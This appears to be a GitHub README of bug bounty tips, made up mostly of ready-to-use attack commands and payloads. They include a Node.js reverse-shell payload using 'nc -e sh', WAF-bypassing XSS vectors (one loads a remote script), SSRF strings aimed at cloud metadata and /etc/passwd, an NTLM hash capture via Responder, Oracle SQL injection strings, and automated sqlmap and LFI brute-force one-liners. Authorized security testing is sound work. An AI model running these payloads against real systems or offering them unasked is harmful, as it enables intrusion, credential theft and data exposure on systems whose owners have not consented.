![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/images/Lets-Dig-into-the-Robust-Bug-Bounty-Program-Developed-by-Google.png)
# General tips
1-changing Exif metadata of an image can lead to XSS, RCE ...  [learn more](https://gokulvinesh.medium.com/rce-xss-via-image-exif-metadata-dddf33dadb41).

2-If there is a route to `/blog`
don't forget to test `/blog/.env` 

3-If you find Web frameworks like Symfony, add 

`/app_dev.php/_profiler/open?file=app/config/parameters.yml`
`/app_dev.php/_profiler/open?file=app/config/parameters.yml.dist`
`/app_dev.php/_profiler/open?file=app/config/security.yml`

to the wordlist, and you may get juicy data.

4-Use http://censys.io for finding hidden domain IPs and and try to open the website in the browser with only IP address this time WAF not restrict the request

5-get all inscope from h1
```
bbscope h1 -t Token -u username -b -o t
```
# Recon
1-Google Dorks for recon
```
site:*.google.*
site:google.*
site:*.google.com
site:*.google.-*.* -> (good results)
```

2-Extract JS files with katana:

`katana -u https://test.com -jc -d 2 | grep ".js$" | uniq | sort > js.txt`

3-fuzz
Finding hidden directory’s 
```
/.FUZZ
/-FUZZ
/~FUZZ
/../FuZZ
```
4-
```inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:test.com```

5-find emails
```
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" file.txt
```
6-
```
cat urls.txt | grep ".txt$" > textfiles.txt
cat urls.txt | grep ".json$" > jsonfiles.txt
cat urls.txt | grep ".js$" > jsfiles.txt
cat urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' > asphpfiles.txt
```
# RCE
1-If you discover a node.js template area, you should try triggerable node payload </br>
`require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
# SQLi
1-sqlmap + waybackurls
```
waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
```
2-Time based + waybackurls
```
#waybackurls http://test.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
#cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"
```
3-bypass waf
```
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
```
# XSS
1-The new reportError() function enables a quite amusing XSS vector:
```
window.name='alert(1)'
reportError(name , enerror=eval)
```
2-If you see `returnTo=` in login url , add `javascript:alert(1)` and login > xss alert.<br>
3-Amazon CloudFront WAF sometimes can be easily bypassed with `<svg onload=(alert)(1)` instead of `<svg onload=alert(1)`<br>
4-Bypass Waf <br>
```
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
```
5-Bypass XSS WAF protection using a comment between a JS function name and parameters
```
<img/src/onerror=alert/*1337*/(1)>
<img/src/onerror=alert//&NewLine;(2)>
<img/src/onerror=alert&sol;**&sol;(3)>
```
<br>
6-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>

```
<img/src/onerror=alert&#xFEFF;(1337)>
```
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Whitespace%20Separators.jpeg)

7-
The Best Simple #XSS Payload

`<Img Src=//X55.is OnLoad=import(src)>`

Reasons:

1. It loads a remote script 
2. It pops in SOURCE and DOM
3. It allows custom code in URL hash

8-waybackurls+ kxss
```
waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls-xss.txt | sort -u -o urls-xss.txt && cat urls-xss.txt | kxss
```
9-CSP bypass
```
www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
```
10-bypass waf
```
alert?.(1)
window&&=(window&&=opener||=alert)?.(1??0,)
```
# SSRF
1-Try other URL schemes:<br>
```
• file:// (file read)
• netdoc:// (file read)
• dict://
• gopher://
• jar://
• ldap://
• and more!
```
<br>
You might be able to get file read.
<br>
Or send multi-line requests to gain additional impact
<br>
(Ex: gopher + redis = likely RCE)<br>
<br>

2-Is the target running Windows?

Can't hit internal services?

(Well, try this even if you can)

Try to steal NTLM hashes with Responder.

`/vulnerable?url=http://your-responder-host`
<br><br>
3-Try alternative representations of IP addresses.

IPs can be represented in many ways including:
```
• octal
• decimal
• hexadecimal
• etc.
```
Try different representations.

You might get lucky.
<br><br>
4-Can't hit `169.254.169.254`?

On AWS, "instance-data" resolves to the metadata server.

Try hitting `http://instance-data` instead.
<br><br>
5- Know your target's technologies.

Look at job postings!

You might not be able to hit a meta-data service.

But there are likely other internal services!

(ex: I've pulled data from an internal Elasticsearch instance)
<br><br>
6- Are they using Kubernetes?

Search Burp history for `.default.svc` or `.cluster.local`

If you find references, try to hit them.

Also, try to hit the Kubernetes API: `https://kubernetes.default.svc`
<br><br>
7- In Kubernetes, you should be brute-forcing for:

`HOSTNAME.<some-namespace>.svc.cluster.local`

I often use Burp Intruder: `FUZZ.default.svc.cluster.local`

Need better wordlists?

Scrape helm charts from ArtifactHub.
<br><br>
8- Can't supply a full URL? You can still get SSRF!

If your input is used to build a URL, THINK.

Learn about URL structures.

The following 4 characters have led to many SSRFs:
```
• @
• ?
• #
• ;
```
An example is in the picture:
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/images/img1.jpeg)
<br><br>
9- If your injection is down the path, traverse!
```
GET /vulnerable?id=1234

|> app fetches: http://some-api/api/v1/1234
```
```

GET /vulnerable?id=../../

|> app fetches: http://some-api/api/v1/../../
```

Find an open redirect & you probably have SSRF.

Or likely can hit internal endpoints.

10- Use Hostnames Instead of IPs

Use services like `http://nip.io` to bypass direct IP bans. 

Here are some examples. All of these resolve to `169.254.169.254`.
```
http://169.254.169.254.nip.io
http://169-254-169-254.nip.io
http://a9fea9fe.nip.io (hexadecimal IP notation)
```
11- HTTP Redirects

Use redirects from a custom domain to a blocked IP to catch applications off-guard! 

Here’s a simple PHP script to perform the redirect.

`<?php header(“Location: http://169.254.169.254/”) ?>`

12- DNS Rebinding

Use TOCTOU vulnerabilities, by providing alternating DNS responses to breach. 

Set up a DNS server that responds with two different IPs on alternating requests, one is allowed through the `ip_is_blocked()` function, and the other is not.

13-Non-Standard IP Notations

Octal, hexadecimal, integer, IPv6 can bypass some IP blockages! 

All these will be interpreted as `169.254.169.254`:
```
025177524776 (octal)
0xa9fea9fe (hexadecimal)
2852039166 (integer)
::ffff:a9fe:a9fe (IPv6)
```
14-SSRF Payloads for LFR/LFD
```
file:/etc/passwd%3F/
file:/etc%252Fpasswd/
file:/etc%252Fpasswd%3F/
file:///etc/%3F/../passwd
file:${br}/et${u}c%252Fpas${te}swd%3F/
file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
```
*SSRF POLYGLOT*

`file:///etc/passwd?/../passwd`
# Rate limit bypass
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
# Line terminators
For XSS / CRLF injection.<br>
🔹LF: %0A (\u000A)<br>
🔹VT: %0B (\u000B)<br>
🔹FF: %0C (\u000C)<br>
🔹CR: %0D (\u000D)<br>
🔹CR+LF: %0D%0A (\u000D\u000A)<br>
🔹NEL: %C2%85 (\u0085)<br>
🔹LS: %E2%80%A8 (\u2028)<br>
🔹PS: %E2%80%A9 (\u2029)<br>
# IDOR:
1-<br>
```
/api/getUser$FUZZ$
-> /api/getUserv1
-> /api/getUserBeta
```
2-if you find something like this
```
POST /api/v3/SetEmail
```
-try to change v3 to v2,v1,v1-beta...

-add some parameter for example userid 
```
/api/v3/SetEmail/1337
```
-try to remove cookies or set unvalid ones
# SQL INJECTION
1-If you discover an oracle web app, try this payload
```
EHY01%27OR+1%3d1+AND+NVL(ASCII(SUBSTR((SELECT+chr(78)%7c%7cchr(69)%7c%7cchr(84)%7c%7cchr(83)%7c%7cchr(80) )%7c%7cchr(65)%7c%7cchr(82)%7c%7cchr(75)%7c%7cchr(69)%7c%7cchr(82)+FROM+DUAL)%2c9%2c1))%2c0) %3d82--
```
# LFI
LFI exploitation tool

1.Gather Parameters from wayback
```
waybackurls target | grep -Eo '\b[^=&?]+\=[^&?]+' | awk -F= '{print $1}' | sort -u
```
2.Bruteforce LFI
```
xargs -I{} httpx -silent -path "?{}=/../../../../../../../../etc/hosts" -u target
```
